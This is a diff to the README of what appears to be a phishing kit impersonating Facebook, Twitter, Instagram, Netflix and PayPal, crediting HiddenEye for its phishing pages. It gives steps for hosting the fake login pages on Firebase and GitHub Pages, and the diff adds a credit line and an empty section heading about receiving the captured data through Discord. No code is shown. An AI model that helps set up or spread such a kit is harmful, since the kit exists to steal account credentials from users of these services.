@@ -16,6 +16,7 @@ FACEBOOK | TWITTER | INSTAGRAM | NETFLIX | PAYPAL
 
 ## CREDITS
 * HiddenEye ( For there Phishing Pages ) 
+* [GraySuit](https://github.com/graysuit) 
 
 ## How To Use
  1. After Creating a Firebase Project Create a new Web app.
@@ -28,6 +29,9 @@ FACEBOOK | TWITTER | INSTAGRAM | NETFLIX | PAYPAL
  1. Open app.js file and paste the Config that you have copied in step 2.
  1. Go to settings of the repository To setup GitHub Pages and select master branch as source.
  1. Now your website is ready.
+
+## * Receiving Data Through Discord
+
 
 ## Consider Donating 
 * [PayPal](https://paypal.me/SaritaChaubey/)
